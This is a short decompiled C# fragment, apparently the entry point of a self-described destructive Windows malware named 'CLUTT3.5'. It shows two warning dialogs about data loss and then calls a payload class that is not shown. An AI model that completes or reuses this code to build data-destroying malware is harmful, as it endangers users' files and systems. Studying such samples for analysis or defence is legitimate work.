using System;
using System.Windows.Forms;

// Token: 0x02000027 RID: 39
public class GClass6
{
	// Token: 0x060000BA RID: 186 RVA: 0x00005BA8 File Offset: 0x00003DA8
	public static void smethod_0(string[] string_0)
	{
		if (MessageBox.Show(string.Concat(new string[]
		{
			"Before running the software, I want to warn you that this is a malicious program that can corrupt all data.",
			Environment.NewLine,
			"Are you 100% sure you want to run this file?",
			Environment.NewLine,
			"The author of this malware is not responsible for any damages!"
		}), "WARNING - CLUTT3.5 CREATED BY CYBER SOLDIER(CLUTTER)", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
		{
			Environment.Exit(-1);
			return;
		}
		if (MessageBox.Show(string.Concat(new string[]
		{
			"THIS IS THE LAST WARNING!",
			Environment.NewLine,
			"IF YOU RUN THIS MALWARE YOU WILL LOSE ALL YOUR DATA!",
			Environment.NewLine,
			Environment.NewLine,
			"CLICK \"NO\" TO EXIT!"
		}), "LAST WARNING - CLUTT3.5 CREATED BY CYBER SOLDIER(CLUTTER)", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) != DialogResult.No)
		{
			new GClass7().method_0();
			return;
		}
		Environment.Exit(-1);
	}
}
